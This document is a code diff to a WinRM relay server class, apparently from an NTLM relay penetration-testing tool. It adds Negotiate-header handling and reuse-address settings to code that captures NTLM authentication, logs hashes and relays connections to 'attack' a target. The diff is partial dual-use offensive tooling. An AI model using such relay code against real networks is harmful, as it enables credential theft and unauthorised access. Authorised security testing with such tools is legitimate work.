@@ -41,6 +41,7 @@ class WinRMRelayServer(Thread):
                 self.address_family = socket.AF_INET6
             # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
+            socketserver.TCPServer.allow_reuse_address = True
             socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
 
     class HTTPHandler(http.server.SimpleHTTPRequestHandler):
@@ -82,7 +83,7 @@ class WinRMRelayServer(Thread):
 
         def log_message(self, format, *args):
             return
-        
+
         def send_error(self, code, message=None):
             if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
                 LOG.info('WinRM(%s): send_error path: %s' % (self.server.server_address[1], self.path.lower()))
@@ -137,6 +138,7 @@ class WinRMRelayServer(Thread):
                 self.wfile.write(imgFile_data)
 
         def strip_blob(self, proxy):
+            token = messageType = None
             if PY2:
                 if proxy:
                     proxyAuthHeader = self.headers.getheader('Proxy-Authorization')
@@ -158,14 +160,17 @@ class WinRMRelayServer(Thread):
                 else:
                     typeX = autorizationHeader
                 try:
-                    _, blob = typeX.split('NTLM')
+                    try:
+                        _, blob = typeX.split('NTLM')
+                    # Not using NTLM but Negotiate
+                    except ValueError:
+                        _, blob = typeX.split('Negotiate')
                     token = base64.b64decode(blob.strip())
                 except Exception:
                     LOG.debug("Exception:", exc_info=True)
                     self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
-
             return token, messageType
 
         def do_HEAD(self):
@@ -249,7 +254,7 @@ class WinRMRelayServer(Thread):
             return
 
         def do_GETPOST(self):
-           
+
             if self.command == 'POST' and "/wsman" in self.path.lower():
                 content_length = int(self.headers.get('Content-Length', 0))
                 self.rfile.read(content_length)
@@ -257,7 +262,7 @@ class WinRMRelayServer(Thread):
                 LOG.info('WinRM(%s): Client requested path: %s' % (self.server.server_address[1], self.path.lower()))
                 self.send_not_found()
                 return
-                
+
             # Determine if the user is connecting to our server directly or attempts to use it as a proxy
             if len(self.path) > 4 and self.path[:4].lower() == 'http':
                 proxy = True
@@ -415,7 +420,7 @@ class WinRMRelayServer(Thread):
 
                         LOG.info("WinRM(%s): Connection from %s@%s controlled, attacking target %s://%s" % (self.server.server_address[1],
                             self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
-                 
+
                         self.do_REDIRECT()
 
             elif messageType == 3:
@@ -475,7 +480,7 @@ class WinRMRelayServer(Thread):
                         LOG.info(ntlm_hash_data['hash_string'])
 
                     self.do_attack()
-                    
+
                     if self.server.config.disableMulti:
                         # We won't use the redirect trick, closing connection...
                         if self.command == "PROPFIND":
